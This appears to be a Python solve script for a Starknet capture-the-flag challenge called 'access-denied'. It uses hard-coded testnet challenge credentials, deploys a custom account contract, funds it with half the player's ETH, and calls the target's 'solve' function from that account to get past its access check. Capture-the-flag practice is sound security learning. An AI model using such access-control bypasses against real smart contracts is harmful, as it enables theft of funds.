# Usage:
import asyncio
import json
import os
import subprocess
from pathlib import Path

from starknet_py.contract import Contract
from starknet_py.net import AccountClient
from starknet_py.net.gateway_client import GatewayClient, InvokeFunction
from starknet_py.net.signer.stark_curve_signer import KeyPair
from starknet_py.transactions.deploy import make_deploy_tx
from starkware.starknet.definitions.general_config import StarknetChainId
from starkware.starknet.public.abi import get_selector_from_name

uuid = "5e7e9d45-2e3f-4b0d-abea-daad9d1c29b7"
endpoint = "http://5e7e9d45-2e3f-4b0d-abea-daad9d1c29b7@18.157.198.111:5054"
private_key = "0x10eef3d74511aa0ce58793a3041e09c3"
player_address = "0x5a2117dd900f0cd2f1765de70b29bd7b49f646b96d95627e8a9216b8a2706f2"
contract_address = "0x46a1ead7fda0f3a243b1f80b658c1cb445082f8015c52ad6d6bd7e85855e9f5"

private_key = int(private_key, 16)
player_address = int(player_address, 16)


def int_to_uint256(value):
    low = value & ((1 << 128) - 1)
    high = value >> 128
    return {"low": low, "high": high}


async def run():

    gateway_client = GatewayClient(net=endpoint, chain=StarknetChainId.TESTNET)
    account_client = AccountClient(
        address=player_address,
        client=gateway_client,
        chain=StarknetChainId.TESTNET,
        key_pair=KeyPair.from_private_key(private_key),
        supported_tx_version=1,
    )

    contract = await Contract.from_address(contract_address, account_client)

    deploy_tx = make_deploy_tx(
        constructor_calldata=[KeyPair.from_private_key(private_key).public_key],
        compiled_contract=(
            Path("access-denied") / "build" / "account.json"
        ).read_text(),
    )

    result = await account_client.deploy(deploy_tx)
    await account_client.wait_for_tx(
        tx_hash=result.transaction_hash,
    )

    new_account = AccountClient(
        address=result.contract_address,
        client=gateway_client,
        chain=StarknetChainId.TESTNET,
        key_pair=KeyPair.from_private_key(private_key),
        supported_tx_version=1,
    )

    eth_contract = await Contract.from_address(
        "0x62230ea046a9a5fbc261ac77d03c8d41e5d442db2284587570ab46455fd2488",
        account_client,
    )
    balance = (await eth_contract.functions["balanceOf"].call(player_address)).balance
    tx = await eth_contract.functions["transfer"].invoke(
        new_account.address, int_to_uint256(balance // 2), max_fee=int(1e16)
    )
    await tx.wait_for_acceptance()

    contract = await Contract.from_address(contract_address, new_account)

    tx = await contract.functions["solve"].invoke(max_fee=int(1e16))
    await tx.wait_for_acceptance()

    await contract.functions["solved"].call()


if __name__ == "__main__":
    asyncio.run(run())
